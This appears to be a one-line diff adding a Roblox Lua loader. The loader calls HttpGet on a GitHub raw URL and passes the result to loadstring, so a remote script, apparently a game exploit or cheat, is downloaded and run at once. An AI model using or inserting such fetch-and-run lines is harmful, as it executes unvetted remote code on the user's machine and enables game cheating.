@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinix-Cyber/Roblox-Lua-Code/refs/heads/main/Updated.lua"))()
